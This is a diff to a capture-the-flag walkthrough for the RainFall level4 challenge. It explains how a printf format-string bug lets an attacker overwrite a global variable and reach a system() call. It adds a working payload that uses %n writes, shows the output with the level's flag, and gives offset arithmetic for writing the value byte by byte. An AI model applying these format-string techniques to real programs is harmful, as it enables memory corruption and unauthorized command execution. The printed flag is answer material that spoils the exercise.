@@ -28,10 +28,18 @@ Global variable `m` is compared to `0x1025544` value. As it stored in `.bss` sec
    0x08048499 <+66>:	movl   $0x8048590,(%esp)
    0x080484a0 <+73>:	call   0x8048360 <system@plt>
 ```
-To write a value into 
+Here two method to overwrite variable `m` with value `0x01025544`.
 
-0x08049810
-0x01025544
+The first method, dirty and long, consist in writing 16930116 bytes and use `%n` to write this value (`0x01025544` in Hex) to selected address.
+```gdb
+level4@RainFall:~$ python -c 'print "\x10\x98\x04\x08" + "%016930112x%12$n"' | ./level4
+000000000000000000000000000000000000000000000000000000000000000000000000000000000000000[...]b7ff26b0
+0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
+```
+
+The second one, is more creative and faster. It consit in writing in each byte of variable `m` which is lay between `0x08049810` to `0x08049813`.
+First of all, those byte addresses where values should be written are putted on stack. Then, the value which should be written is divided by bytes `0x44`, `0x55`, `0x02`, `0x01`. It is done to calculate an offset for each value. This offest value would be a number which will be written in carefully-selected address. As addresses were placed previously, they can be selected using direct parameter access `$`.
+
 0x44 = 68   | 4+4+4+4+x             = 68  (0x44)  : x = 52
 0x55 = 85   | 4+4+4+4+52+x          = 85  (0x55)  : x = 17
 0x02 = 2    | 4+4+4+4+52+17+x       = 258 (0x102) : x = 173
